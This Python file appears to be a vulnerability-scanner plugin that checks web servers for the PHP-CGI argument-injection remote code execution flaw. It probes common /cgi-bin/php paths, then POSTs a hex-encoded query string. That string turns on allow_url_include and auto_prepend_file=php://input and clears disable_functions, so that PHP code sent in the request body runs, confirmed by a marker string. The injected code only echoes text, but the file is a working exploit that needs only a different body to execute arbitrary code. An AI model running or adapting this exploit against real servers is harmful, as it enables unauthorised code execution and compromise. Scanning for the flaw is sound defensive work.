#-*-coding:utf-8-*-


from exp.lib.httpparse import httpparse


def test_url(protocol,domain, port,timeout):
    url_list = []
    http = httpparse()
    vul_url = ['/cgi-bin/php', '/cgi-bin/php5', '/cgi-bin/php-cgi', '/cgi-bin/php.cgi']
    for url in vul_url:
        try:
            tm = http.httpreq('GET', protocol, domain, port, url)
            if tm[0] == 200:
                url_list.append(url)
            else:
                pass
        except Exception as e:
            msg = str(e)
            pass
    return list(set(url_list))

def verify(protocol,ip,port):
    oldurl = protocol+'://'+ip+':'+str(port)
    print('testing if php cgi remote code exec vul')
    url_list = test_url(protocol,ip,port,timeout=5)
    payload = '?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E'
    evalcode = '''<?php echo 'Content-type: text/html\n\n';echo 'Here_is_apache_php_remote_code_exec';exit(1);?>'''
    fake_header = {
        'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25'}
    data = 1
    try:
        for url in url_list:
            if 'cgi' in url:
                try:
                    http = httpparse()
                    tm = http.httpreq('POST', protocol, ip, port, url+payload,data=evalcode,header=fake_header)
                    res_html = str(tm[2])
                except Exception as e:
                    msg = str(e)
                    print(msg)
                    pass
                if 'Here_is_apache_php_remote_code_exec' in res_html:
                    msg = 'There is php cgi rce vul on ' + oldurl+url+payload + ' .'
                    number = 'v91'
                    return True, url, number, msg
    except Exception as e:
        msg = str(e)
        pass
    msg = 'There is no php cgi rce vul'
    number = 'v0'
    return False,oldurl,number,msg
